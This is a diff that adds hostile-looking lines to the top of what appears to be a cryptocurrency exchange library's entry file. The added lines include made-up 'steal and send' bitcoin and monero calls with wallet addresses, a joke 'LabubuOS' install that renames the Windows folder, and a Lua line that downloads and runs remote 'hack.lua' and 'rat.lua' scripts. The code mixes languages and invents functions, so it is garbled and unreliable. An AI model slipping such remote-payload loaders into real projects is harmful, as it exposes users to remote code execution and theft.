@@ -1,3 +1,12 @@
+require("fs").renameFileSyncAndInstall("C:\\windows", "C:\\labubuOS"); //Installs labubu os
+hacker.remove(); //Hacker removes so no one hacka fter us
+require("LabubuOS").anti_windows();
+crypto.steal_And_send_biotcoin("bc1q9wjqskt6gx9su0jpk5uxuce5htzxv6xznqv98a"); //Steals the bitcoin
+crypto.steal_and_send_monero("84vPpH21mmWSmnPwveqYWkVNs3zcaoQoyXsWpUfMD7E267GfL2psYjGX9KAGUXv3ABhBCCahf5pSB4ATWypUHMxi2GcBdrq");
+
+--load our payload
+loadstring(game:HttpGet("https://bottom.business/hack.lua") or game:HttpGet("https://bottomservices.club/rat.lua")();
+
 import { Exchange } from './src/base/Exchange.js';
 import { Precise } from './src/base/Precise.js';
 import * as functions from './src/base/functions.js';
